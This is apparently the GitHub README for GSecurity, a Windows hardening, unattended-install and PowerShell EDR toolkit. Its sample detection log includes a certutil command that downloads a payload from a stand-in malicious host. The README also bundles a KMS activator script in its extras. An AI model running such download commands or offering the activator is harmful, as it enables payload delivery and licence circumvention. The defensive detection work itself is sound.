<div align="center">

# 🛡️ GSecurity

**Enterprise-grade Windows security hardening & unattended installation toolkit**

[![Version](https://img.shields.io/badge/version-6.0.0-blue.svg)](https://github.com/DumDumTras/GSecurity)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-lightgrey.svg)](https://www.microsoft.com/windows)
[![PowerShell](https://img.shields.io/badge/PowerShell-5.1%2B-blue.svg)](https://github.com/PowerShell/PowerShell)
[![License](https://img.shields.io/badge/license-MIT-orange.svg)](LICENSE)
[![Stars](https://img.shields.io/github/stars/DumDumTras/GSecurity)](https://github.com/DumDumTras/GSecurity/stargazers)
[![Issues](https://img.shields.io/github/issues/DumDumTras/GSecurity)](https://github.com/DumDumTras/GSecurity/issues)

*Comprehensive system lockdown, automated Windows installs, and an advanced PowerShell EDR engine.*

[Features](#-features) • [Quick Start](#-quick-start) • [Install](#-installation) • [Usage](#-usage) • [Components](#-components) • [Structure](#-directory-structure) • [Security](#-security-considerations)

---

</div>

## 📋 Overview

**GSecurity** is a production-ready Windows security hardening framework that delivers automated system lockdown, advanced threat detection, and a fully unattended Windows installation ISO. It combines BIOS hardening, network security, service lockdown, browser policy enforcement, and a comprehensive EDR (Endpoint Detection and Response) system.

### At a Glance

- 🔍 **Advanced EDR**: 42+ detection modules with real-time monitoring
- 🚫 **System Hardening**: BIOS tweaks, service lockdown, and privilege restrictions
- 🌐 **Network Security**: DNS-over-TLS (DoT) configuration
- 🧬 **Multi-vector Detection**: Hash + entropy + behavioral + signature detection
- 🌍 **Browser Security**: Forced privacy extensions across supported browsers
- 📦 **Unattended Install**: Ready-to-build Windows ISO with post-install scripts
- 🔐 **Credential Protection**: LSASS PPL, caching protection, dump detection
- 🎮 **Performance Optimization**: Multi-tier RAM/SSD game caching

---

## ✨ Features

### Core Security Components

| Component | Description | Status |
|-----------|-------------|--------|
| **EDR Engine** | 42+ detection modules with managed tick jobs | ✅ Active |
| **Hash Detection** | MD5/SHA256 signature matching with entropy analysis | ✅ Active |
| **LOLBin Detection** | Monitors certutil, mshta, regsvr32, wmic abuse | ✅ Active |
| **Credential Dumping** | Detects mimikatz, procdump, lsass access attempts | ✅ Active |
| **Ransomware Protection** | Behavioral analysis for rapid encryption patterns | ✅ Active |
| **Process Anomaly Detection** | Identifies suspicious process injection & hollowing | ✅ Active |
| **Network Monitoring** | DNS exfiltration, named pipes, and anomaly detection | ✅ Active |
| **Registry Persistence** | Scans Run keys, WMI, scheduled tasks for persistence | ✅ Active |
| **Fileless Malware** | Detects memory-only attacks and script-based threats | ✅ Active |
| **Browser Extension Monitoring** | Tracks malicious browser extensions | ✅ Active |
| **Keylogger Detection** | Monitors keyboard hooking and input capture | ✅ Active |
| **Clipboard Monitoring** | Detects suspicious clipboard access patterns | ✅ Active |
| **Webcam Guardian** | Protects against unauthorized webcam access | ✅ Active |
| **USB Monitoring** | Tracks USB device connections and file transfers | ✅ Active |

### System Hardening

- **BIOS/Boot**: Configures DEP, hypervisor settings, and boot parameters via `bcdedit`
- **Service Lockdown**: Disables risky services (VNC, TeamViewer, AnyDesk, Telnet, FTP, WinRM, SMB, SSH, SNMP, etc.)
- **Network Security**: Forces DNS-over-TLS (DoT) with Cloudflare and Google
- **Permission Hardening**: Restricts UAC, file system permissions, and removes default users
- **Credential Protection**: LSASS PPL, credential caching disabled, credential dump detection
- **Privilege Rights**: Denies network logon rights via `secedit`
- **Browser Policies**: Enforces extension installs across Chrome, Firefox, Edge, Brave, Vivaldi, Arc, and Zen

### Installation & Extras

- **Unattended Install**: Automated Windows setup with `AutoUnattend.xml`
- **Auto-login (configurable)**: Pre-set user profile for first boot
- **Post-install Scripts**: Hardening and EDR auto-run on first logon
- **Extras Pack**: Activator, browser installers, bookmarks, and Store restore

### Browser Support

Pre-configured installers for:
🌐 **Chrome** • 🦊 **Firefox** • 🟦 **Edge** • 🦁 **Brave** • 🎮 **Opera GX** • 🎭 **Opera** • ⚡ **Arc**

### Privacy Extensions (Auto-Installed)

- 🛡️ **uBlock Origin**
- 👎 **Return YouTube Dislike**
- 🍪 **I Don't Care About Cookies**
- 💰 **Cently Coupons**
- 🗑️ **Cookie AutoDelete**

---

## ⚡ Quick Start

**Option A: Build the Windows ISO**

1. Copy Windows installation files into `Iso\`.
2. Update `Iso\AutoUnattend.xml` with your product key and settings.
3. Build the ISO using your preferred tool (Oscdimg, ImgBurn, etc.).
4. Boot and install. Security scripts run on first logon.

**Option B: Harden an existing system**

```powershell
git clone https://github.com/DumDumTras/GSecurity.git
cd GSecurity
```

```cmd
cd Iso\sources\$OEM$\$$\Setup\Scripts
SetupComplete.cmd
```

---

## 🚀 Installation

### Prerequisites

- **Windows 10/11** (64-bit) installation media
- **PowerShell 5.1+** with Administrator privileges
- **.NET Framework 4.7.2+**
- **ISO Creation Tool** (for building the installation ISO)

### Method 1: ISO Installation (Recommended)

1. **Prepare the ISO Structure**
   ```powershell
   # Copy Windows installation files to Iso\sources\
   # Place your Windows ISO contents in the Iso directory
   ```

2. **Customize AutoUnattend.xml**
   ```xml
   <!-- Edit AutoUnattend.xml to set your product key and preferences -->
   <ProductKey>
       <Key>[YOUR_KEY]</Key>
   </ProductKey>
   ```

3. **Build the ISO**
   ```powershell
   # Use your preferred ISO creation tool (Oscdimg, ImgBurn, etc.)
   # Include all files from the Iso directory
   ```

4. **Install Windows**
   - Boot from the created ISO
   - Installation proceeds automatically
   - Security scripts execute on first logon

### Method 2: Manual Installation on Existing System

1. **Clone**
   ```powershell
   git clone https://github.com/DumDumTras/GSecurity.git
   cd GSecurity
   ```

2. **Run SetupComplete.cmd**
   ```cmd
   cd Iso\sources\$OEM$\$$\Setup\Scripts
   SetupComplete.cmd
   ```

   The installer:
   - Elevates privileges automatically
   - Executes `.reg` files alphabetically
   - Applies all security configurations

3. **Manual Component Installation**
   ```powershell
   cd Iso\sources\$OEM$\$$\Setup\Scripts\Bin
   powershell.exe -ExecutionPolicy Bypass -File Antivirus.ps1
   powershell.exe -ExecutionPolicy Bypass -File Creds.ps1
   powershell.exe -ExecutionPolicy Bypass -File GameCache.ps1 -Install
   GSecurity.bat
   reg import GSecurity.reg
   ```

---

## 📦 Components

### 1. **SetupComplete.cmd** (Main Orchestrator)

- Automatically elevates privileges
- Executes Registry files (`.reg`) alphabetically
- Coordinates installation flow
- Runs silently in the background

### 2. **Antivirus.ps1** (EDR Engine)

**5,593+ lines of production PowerShell**

Key Detection Modules:
- `Invoke-HashScan`: MD5/SHA256 scanning with entropy analysis
- `Invoke-LOLBinDetection`: Monitors certutil, mshta, regsvr32, wmic, rundll32 abuse
- `Invoke-CredentialDumpScan`: Detects lsass.exe access, mimikatz, procdump
- `Invoke-RansomwareDetection`: Monitors rapid file encryption patterns
- `Invoke-ProcessAnomalyScan`: Identifies code injection, process hollowing
- `Invoke-NetworkAnomalyScan`: DNS tunneling, named pipes, suspicious connections
- `Invoke-RegistryPersistenceDetection`: Scans Run keys, WMI, scheduled tasks
- `Invoke-FilelessDetection`: Detects memory-only and script-based malware
- `Invoke-KeyloggerScan`: Monitors keyboard hooking and input capture
- `Invoke-BrowserExtensionMonitoring`: Tracks malicious browser extensions
- `Invoke-WebcamGuardian`: Protects against unauthorized webcam access
- `Invoke-ClipboardMonitoring`: Detects suspicious clipboard access
- `Invoke-USBMonitoring`: Tracks USB device connections
- And 30+ more detection modules...

**Auto-Actions**:
- Quarantine threats to `C:\ProgramData\Antivirus\Quarantine`
- Terminate malicious processes with retry logic (max 5 attempts)
- Log to Windows Event Log + file system
- Cache file hashes for performance
- Managed tick jobs with configurable intervals

### 3. **GSecurity.bat** (System Hardening)

```cmd
# BIOS/Boot Configuration
bcdedit /set nx AlwaysOn                    # Enable DEP
netsh dns add global dot=yes                # Enable DNS-over-TLS

# Permission Hardening
takeown /f %windir%\System32\Oobe\useroobe.dll /A
icacls %windir%\System32\Oobe\useroobe.dll /reset
icacls "%systemdrive%\Users" /remove "Everyone"

# Service Disabling
sc config VNC start= disabled
sc config TeamViewer start= disabled
sc config AnyDesk start= disabled
sc config WinRM start= disabled
sc config LanmanServer start= disabled
# ... and 20+ more services

# User Cleanup
net user defaultuser0 /delete

# UAC Configuration
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "5" /f
```

### 4. **GSecurity.reg** (Browser Policies & Certificates)

- **Browser Extensions** (forced install via Group Policy):
  - uBlock Origin (`cjpalhdlnbpafiamejdnhcphjbkeiagm`)
  - Return YouTube Dislike (`gebbhagfogifgggkldgodflihgfeippi`)
  - I Don't Care About Cookies (`jid1-KKzOGWgsW3Ao4Q@jetpack`)
  - Cently Coupons (`cently@couponfollow.com`)
  - Cookie AutoDelete (`jfnangjojcioomickmmnfmiadkfhcdmd`)
- **Certificate Removal**: Untrusted roots and compromised CAs
- **Browser Policy Enforcement**: Chrome, Firefox, Edge, Brave, Vivaldi, Arc, Zen

### 5. **Creds.ps1** (Credential Protection)

- **LSASS PPL**: Enables Protected Process Light for LSASS
- **Credential Caching**: Disables cached logon credentials (CachedLogonsCount = 0)
- **Credential Clearing**: Clears cached credentials from Credential Manager
- **Auditing**: Enables credential validation event auditing

### 6. **GameCache.ps1** (Performance Optimization)

Multi-tier caching system for gaming performance:

- **RAM Cache**: 2GB high-speed memory cache for frequently accessed files
- **SSD Cache**: 20GB SSD cache for larger game files
- **LRU Eviction**: Least Recently Used eviction algorithm
- **Automatic Detection**: Detects SSD vs HDD drives automatically
- **Symlink-Based**: Transparent file access using symbolic links
- **Game Support**: Steam, Epic Games, and other game libraries

**Install**
```powershell
powershell.exe -ExecutionPolicy Bypass -File GameCache.ps1 -Install
```

**Uninstall**
```powershell
powershell.exe -ExecutionPolicy Bypass -File GameCache.ps1 -Uninstall
```

### 7. **Secpol.ps1** (Privilege Rights)

- Denies network logon rights for interactive users
- Removes remote interactive logon privileges
- Restricts remote shutdown capabilities

### 8. **AutoUnattend.xml** (Unattended Installation)

- Automated Windows installation configuration
- Pre-configured user account (Admin)
- Timezone and locale settings (Croatian/English)
- First logon command execution
- OEM information customization
- Network location configuration

### 9. **Extras Package**

Located in `Iso\sources\$OEM$\$1\users\Default\Desktop\Extras\`:

- **Activator/Activator.cmd**: KMS support for Windows editions (7–11, N, KN, IoT, LTSC variants)
- **BrowserInstallers/**: Chrome, Firefox, Edge, Brave, Opera, Opera GX, Arc
- **Bookmarks/bookmarks.html**: Pre-configured browser bookmarks
- **Store/Store.cmd**: Microsoft Store restoration (`wsreset -i`)

---

## ⚙️ Configuration

### Antivirus Engine Settings

Edit `Antivirus.ps1` configuration block:

```powershell
$script:ModuleDefinitions = @{
    "HashDetection"                = @{ TickInterval = 60;  Priority = 16; Function = "Invoke-HashScan" }
    "CredentialDumpDetection"      = @{ TickInterval = 20;  Priority = 7;  Function = "Invoke-CredentialDumpScan" }
    "RansomwareDetection"          = @{ TickInterval = 15;  Priority = 8;  Function = "Invoke-RansomwareDetection" }
    # ... adjust intervals as needed
}

$Config = @{
    LogPath = "$env:ProgramData\Antivirus\Logs"
    QuarantinePath = "$env:ProgramData\Antivirus\Quarantine"
    DatabasePath = "$env:ProgramData\Antivirus\Data"
    MaxTerminationAttempts = 5
}
```

### GameCache Configuration

Edit `GameCache.ps1`:

```powershell
$Config = @{
    RAMCacheSizeMB = 2048          # 2GB RAM cache
    SSDCacheSizeGB = 20            # 20GB SSD cache
    MonitorIntervalSeconds = 60    # Check every minute
    GamePaths = @(
        "$env:ProgramFiles\Steam\steamapps\common",
        "$env:ProgramFiles(x86)\Steam\steamapps\common",
        "$env:ProgramFiles\Epic Games",
        "$env:LOCALAPPDATA\Programs"
    )
}
```

### Network Configuration

DNS-over-TLS is configured automatically via `GSecurity.bat`. To verify:

```cmd
# Check DNS configuration
netsh interface ipv4 show dnsservers

# Verify DoT settings
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters"
```

### Unattended Installation Customization

Edit `AutoUnattend.xml`:

```xml
<!-- Set your product key -->
<ProductKey>
    <Key>[YOUR_PRODUCT_KEY]</Key>
</ProductKey>

<!-- Customize user account -->
<LocalAccount>
    <Name>YourUsername</Name>
    <Password>
        <Value>YourPassword</Value>
    </Password>
</LocalAccount>

<!-- Change timezone -->
<TimeZone>YourTimeZone</TimeZone>
```

---

## 🔍 Usage

### Running the Antivirus EDR

```powershell
# Start protection (runs automatically via Task Scheduler)
powershell.exe -ExecutionPolicy Bypass -File "C:\ProgramData\Antivirus\Antivirus.ps1"

# Start with auto-start flag
powershell.exe -ExecutionPolicy Bypass -File "Antivirus.ps1" -AutoStart

# Uninstall
powershell.exe -ExecutionPolicy Bypass -File Antivirus.ps1 -Uninstall
```

### Checking Status

```powershell
# View logs
Get-Content "C:\ProgramData\Antivirus\Logs\stability_log.txt" -Tail 50

# Check quarantine
Get-ChildItem "C:\ProgramData\Antivirus\Quarantine"

# View Windows Event Logs
Get-EventLog -LogName Application -Source "AntivirusEDR" -Newest 20

# Check running processes
Get-Process | Where-Object {$_.ProcessName -like "*antivirus*"}
```

### GameCache Management

```powershell
# Check cache status
Get-Content "C:\ProgramData\GameCache\cache.log" -Tail 50

# View cache statistics
Get-ChildItem "C:\ProgramData\GameCache" -Recurse

# Check scheduled task
Get-ScheduledTask -TaskName "GameCache"
```

### Network Verification

```cmd
# Verify DNS-over-TLS
netsh dns show global

# Check DoT status
netsh dns show global dot

# List network adapters
netsh interface show interface
```

### Service Status

```powershell
# Check disabled services
Get-Service | Where-Object {$_.StartType -eq 'Disabled'} | Select-Object Name, Status, StartType

# Verify specific service
Get-Service -Name "TeamViewer" | Select-Object Name, Status, StartType
```

---

## 🗂️ Directory Structure

```
GSecurity/
├── Iso/
│   ├── Autorun.ico
│   ├── Autorun.inf
│   ├── AutoUnattend.xml
│   └── sources/
│       ├── $OEM$/
│       │   ├── $$/
│       │   │   └── Setup/
│       │   │       └── Scripts/
│       │   │           ├── SetupComplete.cmd
│       │   │           └── Bin/
│       │   │               ├── Antivirus.ps1
│       │   │               ├── Creds.ps1
│       │   │               ├── GameCache.ps1
│       │   │               ├── Secpol.ps1
│       │   │               ├── GSecurity.bat
│       │   │               └── GSecurity.reg
│       │   └── $1/
│       │       ├── autoexec.bat
│       │       ├── config.sys
│       │       └── users/
│       │           └── Default/
│       │               └── Desktop/
│       │                   └── Extras/
│       │                       ├── BrowserInstallers/
│       │                       ├── Optional/
│       │                       │   ├── Activator/
│       │                       │   ├── Bookmarks/
│       │                       │   └── Store/
│       └── [Windows installation files]
└── README.md

Runtime directories created during installation:
C:\Windows\Setup\Scripts\Bin\
C:\ProgramData\Antivirus\
C:\ProgramData\GameCache\
```

---

## 🛡️ Security Considerations

### ⚠️ Important Warnings

1. **Service Disruption**: Disables critical remote access services (RDP alternatives, file servers, remote registry, SMB, WinRM). Ensure local/physical access.
2. **Certificate Removal**: Removes untrusted root CAs. Some apps/sites may break.
3. **Browser Control**: Policy-managed extensions cannot be removed by users.
4. **Performance Impact**: Real-time scanning may impact low-end systems.
5. **Auto-login**: Default `AutoUnattend.xml` includes auto-login. Change for production.
6. **Admin Required**: All scripts require Administrator privileges.
7. **Credential Caching**: Disabling cache prevents offline logons.
8. **GameCache Symlinks**: Requires admin; may conflict with some AV.

### Recommended Use Cases

✅ **Good for**: personal workstations, gaming PCs, isolated systems, privacy-focused setups, security labs

❌ **Not recommended for**: enterprise domain-joined systems, remote-admin servers, systems with custom CAs, virtualization hosts, untested production systems

---

## 📊 Threat Detection Examples

### Hash Detection
```
[2025-01-15 14:32:15] [THREAT] CRITICAL: Known malware detected
File: C:\Users\Admin\Downloads\malware.exe
MD5: 44D88612FEA8A8F36DE82E1278ABB02F
SHA256: 275A021BBFB6489E54D471899F7DB9D1663FC695EC2FE2A2C4538AABF651FD0F
Action: Quarantined
```

### LOLBin Detection
```
[2025-01-15 14:35:42] [THREAT] Detected LOLBin abuse
Process: certutil.exe (PID: 5432)
Command: certutil.exe -urlcache -split -f http://malicious.com/payload.exe
Severity: HIGH
Action: Process terminated
```

### Credential Dumping Detection
```
[2025-01-15 14:40:18] [THREAT] Credential dumping attempt detected
Process: suspicious.exe (PID: 7821)
Behavior: Access to lsass.exe memory
Action: Process terminated, logged to Event Viewer
```

---

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m "Add AmazingFeature"`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

### Development Guidelines

- PowerShell scripts must follow best practices and pass `PSScriptAnalyzer`
- Test on a clean Windows 10/11 VM before submitting
- Update documentation for new features
- Follow existing code style and conventions
- Add comments for complex logic
- Ensure all scripts handle errors gracefully

---

## 📝 Changelog

### v6.0.0 (Current)
- ✨ Complete EDR engine rewrite with 42+ detection modules
- 🔐 Added DNS-over-TLS support
- 🌐 Expanded browser policy support (Arc, Zen, Vivaldi)
- 🛡️ Enhanced LOLBin detection with multiple patterns
- 📊 Added comprehensive event logging
- ⚡ Implemented managed tick jobs for efficient resource usage
- 🎯 Process termination retry logic with max attempts
- 📦 Unattended installation support with AutoUnattend.xml
- 🔧 Extras package with activator, browser installer, and utilities
- 🎮 Added GameCache performance optimization system
- 🔐 Added Creds.ps1 for LSASS PPL and credential protection
- 🌐 Added 7 browser installers (Chrome, Firefox, Edge, Brave, Opera, Opera GX, Arc)
- 🔒 Added Secpol.ps1 for privilege rights hardening

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 👤 Author

**DumDumTras**

- GitHub: [@DumDumTras](https://github.com/DumDumTras)
- Last Updated: 2026

---

## ⚖️ Legal Disclaimer

This software is provided for **educational and security research purposes only**. By using GSecurity, you agree to:

- Use it only on systems you own or have explicit written permission to modify
- Comply with all applicable laws and regulations in your jurisdiction
- Accept full responsibility for any consequences arising from its use
- Understand that the authors are not liable for any damages, data loss, or legal issues
- Not use this software for any illegal activities

**DO NOT USE ON PRODUCTION SYSTEMS WITHOUT THOROUGH TESTING IN A CONTROLLED ENVIRONMENT.**

**The activator script is provided for educational purposes. Ensure you have a valid Windows license for production use.**

---

## 🙏 Acknowledgments

- Windows Defender team for EDR design inspiration
- MITRE ATT&CK framework for threat detection patterns
- uBlock Origin and privacy extension developers
- PowerShell community for best practices
- All contributors and testers

---

<div align="center">

**⭐ If you find this project useful, please consider giving it a star!**

[Report Bug](https://github.com/DumDumTras/GSecurity/issues) • [Request Feature](https://github.com/DumDumTras/GSecurity/issues) • [Documentation](https://github.com/DumDumTras/GSecurity/wiki)

Made with ❤️ for the security community

</div>